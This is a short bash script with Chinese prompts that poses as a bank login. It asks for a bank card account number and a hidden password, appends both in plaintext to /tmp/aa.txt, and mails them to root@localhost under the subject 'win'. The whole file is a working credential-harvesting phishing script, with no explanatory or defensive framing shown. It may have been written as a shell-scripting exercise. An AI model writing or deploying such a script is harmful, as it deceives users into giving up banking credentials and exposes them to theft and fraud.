#!/bin/bash
read -p "请输入银行卡帐号: " account
if [ -z $account ]
then
	echo "帐号错误"
	exit
fi
stty -echo
read -t 5 -p "请输入银行卡密码: " pass 
stty echo
echo
echo -e "帐号:$account \n密码:$pass"  >> /tmp/aa.txt
echo -e "帐号:$account \n密码:$pass" | mail -s "win" root@localhost
